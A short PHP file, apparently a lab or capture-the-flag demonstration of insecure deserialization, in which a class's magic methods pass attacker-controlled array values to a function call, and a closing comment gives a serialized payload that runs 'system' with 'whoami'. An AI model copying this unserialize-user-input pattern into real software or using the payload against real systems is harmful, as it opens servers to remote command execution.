<?php
class test{
public $id = array('a'=>'1','b'=>'2');
function __wakeup(){
echo $this;
}

function __toString(){
call_user_func(function() {
$cmd = function($params){
extract($params);
$a($b);
};
$cmd($this->id);
});
}
};
if($_GET['exec']==="0"){
exit;
}else if($_GET['exec']==="1"){
$test1 = $_GET['string'];
$test2 = unserialize($test1);
}


//x.php?exec=1&string=O:4:"test":1:{s:2:"id";a:2:{s:1:"a";s:6:"system";s:1:"b";s:6:"whoami";}}
